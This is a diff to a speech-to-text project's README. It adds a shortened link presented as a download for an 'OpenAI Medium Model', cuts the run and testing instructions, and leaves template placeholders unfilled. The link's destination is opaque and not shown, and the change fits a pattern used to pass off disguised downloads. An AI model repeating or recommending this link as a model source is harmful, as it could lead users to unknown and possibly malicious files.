@@ -57,7 +57,7 @@ This project requires the following dependencies:
 
 - **Programming Language:** Python
 - **Package Manager:** Conda
-
+- OpenAI Medium Model: https://s.go.ro/960a9gvi
 ### Installation
 
 Build speech-to-text-ai from the source and intsall dependencies:
@@ -83,28 +83,15 @@ Build speech-to-text-ai from the source and intsall dependencies:
 ```
 
 ### Usage
+3. **Download the OpenAI Medium Model:**
 
-Run the project with:
-
-**Using [conda](https://docs.conda.io/):**
+    (https://s.go.ro/960a9gvi)
 
 ```sh
 conda activate {venv}
 python {entrypoint}
 ```
 
-### Testing
-
-Speech-to-text-ai uses the {__test_framework__} test framework. Run the test suite with:
-
-**Using [conda](https://docs.conda.io/):**
-
-```sh
-conda activate {venv}
-pytest
-```
-
----
 
 <div align="left"><a href="#top">⬆ Return</a></div>
 
